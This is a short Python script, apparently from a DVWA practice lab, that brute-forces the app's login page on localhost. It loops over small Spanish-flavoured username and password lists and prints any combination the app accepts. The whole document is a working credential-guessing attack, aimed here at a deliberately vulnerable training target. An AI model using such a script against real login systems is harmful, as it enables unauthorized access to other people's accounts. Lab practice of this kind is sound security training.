import requests

url = "http://localhost:4280/vulnerabilities/brute/"
headers = {"Cookie": "security=low; PHPSESSID=sdfkpu5071jomiisgg5nm9j286"}

usuarios = ["gordonb", "usuario", "dvwa", "test", "pruebas", "pablo", "rene", "marcelo"]
passwords = ["abc123", "user", "ciberseguridad", "fuerzabruta", "americo", "letmein", "guerrero", "aaaaaa"]

for user in usuarios:
    for pwd in passwords:
        r = requests.get(url, params={"username": user, "password": pwd, "Login": "Login"}, headers=headers)
        if "Username and/or password incorrect" not in r.text:
            print(f"[+] Válido: {user}:{pwd}")
